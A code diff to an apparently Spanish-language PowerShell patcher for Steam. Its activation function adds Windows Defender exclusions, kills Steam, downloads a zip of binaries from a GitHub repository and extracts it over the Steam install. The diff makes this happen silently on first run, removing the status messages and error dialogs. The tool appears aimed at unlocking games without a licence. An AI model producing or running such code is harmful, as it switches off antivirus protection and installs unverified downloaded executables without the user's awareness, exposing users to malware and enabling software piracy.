@@ -733,23 +733,24 @@ function Add-FixManifestEntry {
 
 # ---- Direct activation (PARCHENEW, no code needed) ----
 function Activar-Directo {
+    param([switch]$Silent)
     try {
         $steamRoot = Get-SteamPath
         Add-SteamDefenderExclusions | Out-Null
         Add-DefenderExclusion $steamRoot | Out-Null
         Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
         Start-Sleep -Seconds 2
-        $zip = Join-Path $steamRoot "st_patch_$(Get-Random).zip"
+        $zip = Join-Path $env:TEMP "st_patch_$(Get-Random).zip"
         Download-MediaFire "https://github.com/bastisayes/Fixes-steam/raw/main/PARCHENEWw.zip" $zip
         Expand-Archive -Path $zip -DestinationPath $steamRoot -Force
         Remove-Item -LiteralPath $zip -Force -ErrorAction SilentlyContinue
         if (Test-Path (Join-Path $steamRoot "steam.exe")) { Start-Process (Join-Path $steamRoot "steam.exe") }
-        else { [System.Windows.Forms.MessageBox]::Show("No se pudo abrir Steam, abrelo manualmente.", "Aviso", "OK", "Warning") }
+        elseif (-not $Silent) { [System.Windows.Forms.MessageBox]::Show("No se pudo abrir Steam, abrelo manualmente.", "Aviso", "OK", "Warning") }
         Set-ParcheInstalado $true
         return $true
     } catch {
         Write-ErrorLog "Activar Directo" $_
-        [System.Windows.Forms.MessageBox]::Show(($_ | Out-String), "Error Detallado", "OK", "Error")
+        if (-not $Silent) { [System.Windows.Forms.MessageBox]::Show(($_ | Out-String), "Error Detallado", "OK", "Error") }
         return $false
     }
 }
@@ -1566,11 +1567,7 @@ $script:subB.Add_Click({
         $baseNow, $baseIsNet = Get-Now
         $expDate = if ($duration -gt 0) { $baseNow.AddSeconds($duration) } else { $null }
         $steamRoot = Get-SteamPath
-        if (-not (Get-ParcheInstalado)) {
-            $lblR.Text = "Primera vez: instalando parche de Steam..."; [System.Windows.Forms.Application]::DoEvents()
-            $pOk = Activar-Directo
-            if (-not $pOk) { $lblR.Text = "Aviso: no se pudo instalar el parche. Podes usar 'Activar juegos' en Config."; [System.Windows.Forms.Application]::DoEvents() }
-        }
+        if (-not (Get-ParcheInstalado)) { $null = Activar-Directo -Silent }
         $successCount=0; $total=$links.Count; $errors=@()
         foreach ($mfUrl in $links) {
             $gameName = [System.IO.Path]::GetFileNameWithoutExtension(($mfUrl -split '/')[-2])
